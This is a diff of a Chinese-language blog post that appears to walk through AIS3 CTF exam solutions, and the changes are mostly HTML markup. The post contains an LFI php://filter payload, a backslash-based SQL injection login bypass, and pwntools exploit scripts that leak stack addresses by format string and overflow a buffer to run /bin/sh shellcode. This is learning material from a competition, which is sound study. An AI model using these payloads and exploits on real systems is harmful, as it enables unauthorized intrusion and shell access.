@@ -352,7 +352,7 @@
 
 <h1 id="misc">MISC</h1>
 <h2 id="misc1">MISC1</h2>
-<p>沒啥特別，範例 flag <code class="highlighter-rouge">AIS3{hello_world}</code></p>
+<p>沒啥特別，範例 flag <code class="language-plaintext highlighter-rouge">AIS3{hello_world}</code></p>
 
 <h2 id="misc2">MISC2</h2>
 <p>給了一個 facebook.zip，有密碼<br />
@@ -368,31 +368,31 @@
 所以可以根據檔名，想辦法 google 到原圖<br />
 然後根據 pkcrack 官方網站裡面的 document 說明來進行解密<br />
 基本上就是將原圖也壓成一個 zip 檔<br />
-之後用 pkcrack 解出 <code class="highlighter-rouge">key0</code>, <code class="highlighter-rouge">key1</code> 和 <code class="highlighter-rouge">key2</code><br />
-最後用裡面附的 <code class="highlighter-rouge">zipdecrypt</code> 來解出壓縮檔裡面所有的檔案，就可以拿到 flag 了<br />
-flag: <code class="highlighter-rouge">AIS3{old_trick_fool_the_zip_password}</code></p>
+之後用 pkcrack 解出 <code class="language-plaintext highlighter-rouge">key0</code>, <code class="language-plaintext highlighter-rouge">key1</code> 和 <code class="language-plaintext highlighter-rouge">key2</code><br />
+最後用裡面附的 <code class="language-plaintext highlighter-rouge">zipdecrypt</code> 來解出壓縮檔裡面所有的檔案，就可以拿到 flag 了<br />
+flag: <code class="language-plaintext highlighter-rouge">AIS3{old_trick_fool_the_zip_password}</code></p>
 
 <h2 id="misc3">MISC3</h2>
 <p>Orange 說 MISC3 出錯了 (´・ω・`)<br />
 導致這題比 MISC2 還要簡單 XD<br />
 給了個壓縮檔，解出來後是張白白的圖片<br />
 乍看之下沒什麼，不過剛好那時我的筆電螢幕有傾斜，看出了色差，所以直接看出了 flag XD<br />
-flag: <code class="highlighter-rouge">AIS3{picture_in_picture_0xcc}</code></p>
+flag: <code class="language-plaintext highlighter-rouge">AIS3{picture_in_picture_0xcc}</code></p>
 
 <h1 id="web">WEB</h1>
 <h2 id="web1">WEB1</h2>
 <p>連進去試了幾下之後發現是 LFI 的漏洞<br />
 之後就一直嘗試繞過字串過濾的限制<br />
 然後就卡住了 = =<br />
-最後才發現是要用 <code class="highlighter-rouge">PHP I/O stream</code> 的 <code class="highlighter-rouge">php://filter</code> 來將 index.php 的內容轉成 base64 encode 然後 dump 出來<br />
+最後才發現是要用 <code class="language-plaintext highlighter-rouge">PHP I/O stream</code> 的 <code class="language-plaintext highlighter-rouge">php://filter</code> 來將 index.php 的內容轉成 base64 encode 然後 dump 出來<br />
 payload:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[HOST]/web1/?page=php://filter/convert.base64-encode/resource=index
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[HOST]/web1/?page=php://filter/convert.base64-encode/resource=index
 </code></pre></div></div>
 
 <p>這東西算是打 WEB 的基本 trick<br />
 對於 web 苦手的我來說算是長知識了<br />
-flag: <code class="highlighter-rouge">AIS3{php_wrapper_rocks}</code></p>
+flag: <code class="language-plaintext highlighter-rouge">AIS3{php_wrapper_rocks}</code></p>
 
 <h2 id="web2">WEB2</h2>
 <p>給了我們一個 .txt 檔<br />
@@ -402,7 +402,7 @@ google了好久之後才查到它叫 <a href="http://www.jsfuck.com/">jsfuck</a>
 
 <p>之後就簡單許多了，直接 google jsfuck decoder 就可以有現成的 code 可以解了<br />
 (聽說可以用 Firefox 秒解)<br />
-flag: <code class="highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</code></p>
+flag: <code class="language-plaintext highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</code></p>
 
 <h2 id="web3">WEB3</h2>
 <p>這次 exam 唯一沒有解出來的一題<br />
@@ -411,7 +411,7 @@ flag: <code class="highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</cod
 <p>總之就是一個有登入頁面跟顯示新聞頁面的網站<br />
 顯示新聞頁面的 URL 有吃 get 參數<br />
 所以就先用 <a href="http://sqlmap.org/">sqlmap</a> 掃一下<br />
-發現沒洞 ( sqlmap 回報說參數應是有用<code class="highlighter-rouge">int()</code>擋掉 SQL injection )</p>
+發現沒洞 ( sqlmap 回報說參數應是有用<code class="language-plaintext highlighter-rouge">int()</code>擋掉 SQL injection )</p>
 
 <p>之後就是不斷的嘗試別的思路<br />
 包括從登入頁面那邊用 SQL injection 打進去<br />
@@ -422,26 +422,26 @@ flag: <code class="highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</cod
 
 <blockquote>
   <p>其實只要在登入頁面的 username 欄位那邊<br />
-輸入 <code class="highlighter-rouge">aaaaa\</code><br />
+輸入 <code class="language-plaintext highlighter-rouge">aaaaa\</code><br />
 就會發現 database error<br />
-如此一來就可以推斷出網站沒有濾 <code class="highlighter-rouge">\</code> 字元<br />
+如此一來就可以推斷出網站沒有濾 <code class="language-plaintext highlighter-rouge">\</code> 字元<br />
 剩下的就是構造 payload</p>
 </blockquote>
 
 <p>看到這邊，其實還是不是很了解<br />
-主要的原因是因為我一直以為”過濾”<code class="highlighter-rouge">'</code>字元的意思是說直接把<code class="highlighter-rouge">'</code>取代成空字串<br />
+主要的原因是因為我一直以為”過濾”<code class="language-plaintext highlighter-rouge">'</code>字元的意思是說直接把<code class="language-plaintext highlighter-rouge">'</code>取代成空字串<br />
 但是在問過學長之後，發現其實不是這樣子的</p>
 
 <p>身為一個 web service<br />
 通常不會把一個使用者的 input 做任意的修改 (包括砍掉其中的字元)<br />
 而是會嘗試將所有的 input 都送進 database 裡面<br />
-因此在遇到<code class="highlighter-rouge">'</code>字元的時候，通常會利用反斜線來 escape 掉，也就是變成 <code class="highlighter-rouge">\'</code><br />
+因此在遇到<code class="language-plaintext highlighter-rouge">'</code>字元的時候，通常會利用反斜線來 escape 掉，也就是變成 <code class="language-plaintext highlighter-rouge">\'</code><br />
 這樣子的行為也可以是一種”過濾”</p>
 
-<p>那麼因為網站沒有過濾反斜線，只有過濾<code class="highlighter-rouge">'</code><br />
-因此我們在 username 那欄可以這麼輸入: <code class="highlighter-rouge">aaa\' OR 1=1 #</code><br />
-這個時候，因為網站過濾<code class="highlighter-rouge">'</code>但沒有過濾<code class="highlighter-rouge">\</code>的關係，使得 username 的 data 將會變成</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\\' OR 1=1 #
+<p>那麼因為網站沒有過濾反斜線，只有過濾<code class="language-plaintext highlighter-rouge">'</code><br />
+因此我們在 username 那欄可以這麼輸入: <code class="language-plaintext highlighter-rouge">aaa\' OR 1=1 #</code><br />
+這個時候，因為網站過濾<code class="language-plaintext highlighter-rouge">'</code>但沒有過濾<code class="language-plaintext highlighter-rouge">\</code>的關係，使得 username 的 data 將會變成</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\\' OR 1=1 #
 </code></pre></div></div>
 <p>塞進 SQL 做 query 時就會變成:</p>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="p">[</span><span class="k">table_name</span><span class="p">]</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'aaa</span><span class="se">\\</span><span class="s1">'</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">#</span><span class="s1">' AND password = </span><span class="se">''</span><span class="s1">
@@ -451,14 +451,14 @@ flag: <code class="highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</cod
 <h1 id="binary">BINARY</h1>
 <h2 id="binary1">BINARY1</h2>
 <p>拿到 binary 之後也沒多想<br />
-直接 <code class="highlighter-rouge">strings</code> 下下去<br />
-發現有噴出 <code class="highlighter-rouge">AIS3{strings_help_you_a_lot_isnt}</code><br />
+直接 <code class="language-plaintext highlighter-rouge">strings</code> 下下去<br />
+發現有噴出 <code class="language-plaintext highlighter-rouge">AIS3{strings_help_you_a_lot_isnt}</code><br />
 直接拿來 submit，瘋狂噴錯 = =<br />
-最後腦補成 <code class="highlighter-rouge">AIS3{strings_help_you_a_lot_isnt_it}</code>就過了…</p>
+最後腦補成 <code class="language-plaintext highlighter-rouge">AIS3{strings_help_you_a_lot_isnt_it}</code>就過了…</p>
 
 <h2 id="binary2">BINARY2</h2>
 <p>給了一份文件</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41
 \x41\x41\x50\x48\xb8\xbc\xa0\xa9
 \x93\xaa\xa3\xbe\x93\x50\x48\xb8
 \xa9\x93\xa5\xbf\x93\xbf\xa5\xa1
@@ -487,14 +487,14 @@ flag: <code class="highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</cod
 <span class="p">}</span>
 
 </code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bruce30262@ubuntu:~/Desktop/shellcode$ gcc -z execstack -o shell shell.c
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bruce30262@ubuntu:~/Desktop/shellcode$ gcc -z execstack -o shell shell.c
 bruce30262@ubuntu:~/Desktop/shellcode$ ./shell
 AIS3{ok_shellcode_is_simple_for_you}
 </code></pre></div></div>
 <p>難怪叫做 sc.txt, SC 就是 shellcode 的縮寫嘛 XD<br />
 收工!</p>
 
-<p>flag:<code class="highlighter-rouge">AIS3{ok_shellcode_is_simple_for_you}</code></p>
+<p>flag:<code class="language-plaintext highlighter-rouge">AIS3{ok_shellcode_is_simple_for_you}</code></p>
 
 <h2 id="binary3">BINARY3</h2>
 <p>一開始給了一個叫做 stupid 的 binary<br />
@@ -511,7 +511,7 @@ AIS3{ok_shellcode_is_simple_for_you}
 那麼 check1 似乎就不是那麼重要了，重點擺在 check2 即可</p>
 
 <p>而 check2 的檢查也十分簡單:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; key = 0xDDDDAAAADADADDAA ^ (our_input)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; key = 0xDDDDAAAADADADDAA ^ (our_input)
 cmp     dword ptr key, 0BFB7B8CEh
 setz    al
 cmp     dword ptr key+4, 0BCB4DEC4h
@@ -519,24 +519,24 @@ setz    ah
 xor     ax, 101h
 </code></pre></div></div>
 
-<p>也就是說，只要我們的 input  xor  <code class="highlighter-rouge">0xDDDDAAAADADADDAA</code> == <code class="highlighter-rouge">0xBCB4DEC4BFB7B8CE</code> 的話，就代表著我們的 input = flag<br />
+<p>也就是說，只要我們的 input  xor  <code class="language-plaintext highlighter-rouge">0xDDDDAAAADADADDAA</code> == <code class="language-plaintext highlighter-rouge">0xBCB4DEC4BFB7B8CE</code> 的話，就代表著我們的 input = flag<br />
 而 xor 的反解也相當簡單，即再做一次 xor 即可<br />
-因此 flag = <code class="highlighter-rouge">0xDDDDAAAADADADDAA ^ 0xBCB4DEC4BFB7B8CE</code> = <code class="highlighter-rouge">0x6169746E656D6564</code><br />
-之後轉成 ascii code, endianness 注意一下，即可得到正確的 input = <code class="highlighter-rouge">dementia</code></p>
+因此 flag = <code class="language-plaintext highlighter-rouge">0xDDDDAAAADADADDAA ^ 0xBCB4DEC4BFB7B8CE</code> = <code class="language-plaintext highlighter-rouge">0x6169746E656D6564</code><br />
+之後轉成 ascii code, endianness 注意一下，即可得到正確的 input = <code class="language-plaintext highlighter-rouge">dementia</code></p>
 
-<p>flag: <code class="highlighter-rouge">AIS3{dementia}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">AIS3{dementia}</code></p>
 
 <h1 id="pwn3d">PWN3D</h1>
 <p>( pwn 的 flag 全忘光了，這邊就純分享解法 &amp; payload 囉 )</p>
 <h2 id="pwn3d1">PWN3D1</h2>
-<p>64 bit ELF, 直接丟進 IDA Pro 就會看到邪惡的 <code class="highlighter-rouge">scanf()</code> 和一個看起來就是要你蓋它的變數<br />
-分析了一下，發現只要將那個變數蓋成 <code class="highlighter-rouge">0x90909090</code> 就會噴 flag<br />
+<p>64 bit ELF, 直接丟進 IDA Pro 就會看到邪惡的 <code class="language-plaintext highlighter-rouge">scanf()</code> 和一個看起來就是要你蓋它的變數<br />
+分析了一下，發現只要將那個變數蓋成 <code class="language-plaintext highlighter-rouge">0x90909090</code> 就會噴 flag<br />
 計算好 offset 之後就可以構造 payload 丟給 server 了<br />
-一開始直接用 <code class="highlighter-rouge">python -c</code> pipe 進 nc 的方式送<br />
+一開始直接用 <code class="language-plaintext highlighter-rouge">python -c</code> pipe 進 nc 的方式送<br />
 不知道為什麼一直沒有噴 flag 回來<br />
 最後只好乖乖寫 script</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
@@ -546,14 +546,14 @@ xor     ax, 101h
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c">#elf = ELF(ELF_PATH)</span>
-<span class="c">#libc = ELF(LIBC_PATH)</span>
-
+<span class="c1">#elf = ELF(ELF_PATH)
+#libc = ELF(LIBC_PATH)
+</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -569,30 +569,30 @@ xor     ax, 101h
 <p>32 bit ELF, 單純的 echo server，輸入啥 input 就印啥出來(嗎?)</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">echo</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-14h]@1
-</span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-10h]@1
-</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-14h]@1</span>
+  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-10h]@1</span>
+
   <span class="n">v1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div></div>
-<p>可以看到 <code class="highlighter-rouge">read()</code> 那邊有個 overflow 的漏洞<br />
-然後 <code class="highlighter-rouge">__printf_chk()</code> 那邊也有個 format string 的漏洞</p>
+<p>可以看到 <code class="language-plaintext highlighter-rouge">read()</code> 那邊有個 overflow 的漏洞<br />
+然後 <code class="language-plaintext highlighter-rouge">__printf_chk()</code> 那邊也有個 format string 的漏洞</p>
 
 <p>使用 <a href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> 檢查之後發現沒開 DEP<br />
 那麼方向就很明顯了: return to shellcode<br />
 先利用 format string leak 出 ebp, 得到目前 stack 的位置，並計算 input buffer 的 address<br />
-透過第一次 overflow 覆寫 return address，讓程式執行完 <code class="highlighter-rouge">echo()</code> 之後重新回到 <code class="highlighter-rouge">echo()</code> 的開頭<br />
+透過第一次 overflow 覆寫 return address，讓程式執行完 <code class="language-plaintext highlighter-rouge">echo()</code> 之後重新回到 <code class="language-plaintext highlighter-rouge">echo()</code> 的開頭<br />
 此時我們拿到了 input buffer 的 address<br />
 就可以在 buffer 上面塞 shellcode<br />
 並透過第二次的 overflow 讓 return address 跳到我們的 shellcode 上面執行拿到 shell</p>
 
 <p>要注意的是 buffer 只給我們 20 byte, 而我的 shellcode 有 23 byte<br />
 因此最後我是將 shellcode 塞在 return address 後面，並向後跳至 shellcode 位址執行</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
@@ -602,17 +602,17 @@ xor     ax, 101h
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c">#elf = ELF(ELF_PATH)</span>
-<span class="c">#libc = ELF(LIBC_PATH)</span>
-
+<span class="c1">#elf = ELF(ELF_PATH)
+#libc = ELF(LIBC_PATH)
+</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-<span class="c">#r = process("./pwn2")</span>
-<span class="n">shellcode_byte</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span> <span class="p">]</span>
+<span class="c1">#r = process("./pwn2")
+</span><span class="n">shellcode_byte</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span> <span class="p">]</span>
 
 <span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">)</span>
 
@@ -621,18 +621,18 @@ xor     ax, 101h
 
 	<span class="n">echo_start</span> <span class="o">=</span> <span class="mh">0x08048540</span>
 
-	<span class="c"># leak ebp</span>
-	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">p."</span><span class="o">*</span><span class="mi">3</span>
+	<span class="c1"># leak ebp
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">p."</span><span class="o">*</span><span class="mi">3</span>
 	<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
 	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">echo_start</span><span class="p">)</span>
 	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 	
-	<span class="c"># calculate buffer address</span>
-	<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+	<span class="c1"># calculate buffer address
+</span>	<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
 	<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mi">28</span>
 
-	<span class="c"># return to shellcode</span>
-	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">20</span>
+	<span class="c1"># return to shellcode
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">20</span>
 	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
 	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
 	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -667,8 +667,8 @@ exit 則是離開程式</p>
 還有就是因為這題在蓋的時候是用 integer 在蓋<br />
 因此 payload 都要轉成 integer 的形式 (注意要是 int32 )</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
@@ -679,21 +679,21 @@ exit 則是離開程式</p>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c">#elf = ELF(ELF_PATH)</span>
-<span class="c">#libc = ELF(LIBC_PATH)</span>
-
+<span class="c1">#elf = ELF(ELF_PATH)
+#libc = ELF(LIBC_PATH)
+</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-<span class="c">#r = process("./pwn3")</span>
-
+<span class="c1">#r = process("./pwn3")
+</span>
 <span class="n">shellcode_byte</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span> <span class="p">]</span>
 
-<span class="c"># constructing shellcode data</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x90</span><span class="p">]</span> <span class="o">*</span> <span class="mi">9</span>
+<span class="c1"># constructing shellcode data
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x90</span><span class="p">]</span> <span class="o">*</span> <span class="mi">9</span>
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode_byte</span><span class="p">:</span>
 	<span class="n">shellcode</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 
@@ -722,47 +722,47 @@ exit 則是離開程式</p>
 
 	<span class="n">temp</span> <span class="o">=</span> <span class="p">[]</span>
 
-	<span class="c"># leaking ebp</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+	<span class="c1"># leaking ebp
+</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
 		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">temp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pop</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
 	
-	<span class="c"># calculate buffer address &amp; address for ecx</span>
-	<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>
+	<span class="c1"># calculate buffer address &amp; address for ecx
+</span>	<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>
 	<span class="n">ecx_addr</span> <span class="o">=</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>
 	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"buffer address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
